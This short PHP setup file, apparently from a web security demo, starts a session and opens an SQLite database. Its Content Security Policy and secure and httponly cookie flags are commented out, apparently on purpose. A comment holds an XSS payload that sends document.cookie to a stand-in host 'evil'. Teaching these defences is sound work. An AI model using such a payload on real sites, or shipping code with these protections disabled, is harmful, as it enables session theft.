<?php
    // DEMO: Content Security Policy
    //header("Content-Security-Policy: default-src 'self'; script-src 'self' https://tracker; img-src 'self' https://tracker");

    // DEMO: Session cookie security (secure & httponly flags)
    /*
    $cookieParams = session_get_cookie_params();
    session_set_cookie_params(
        $cookieParams['lifetime'],
        $cookieParams['path'],
        $cookieParams['domain'],
        true,
        true
    );
    */
    //:P <script>var img = new Image(); img.src = "http://evil/" + document.cookie;</script>

    session_start();
    $GLOBALS['db'] = new PDO('sqlite:data/db');
    $GLOBALS['db']->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
?>